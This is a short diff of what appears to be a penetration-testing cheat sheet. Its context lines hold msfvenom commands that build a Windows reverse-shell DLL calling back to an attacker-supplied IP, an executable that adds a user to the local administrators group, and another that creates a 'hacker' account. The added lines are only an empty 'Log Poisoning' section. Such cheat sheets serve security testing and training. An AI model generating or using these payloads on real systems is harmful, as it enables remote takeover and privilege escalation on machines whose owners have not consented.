@@ -129,3 +129,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll >
 msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe > addadmin.exe
 msfvenom -p windows/adduser USER=hacker PASS=ComplexP@ssw0rd! -f exe > adduser.exe
 ```
+###  Log Poisoning
+```bash
+
+```
+###
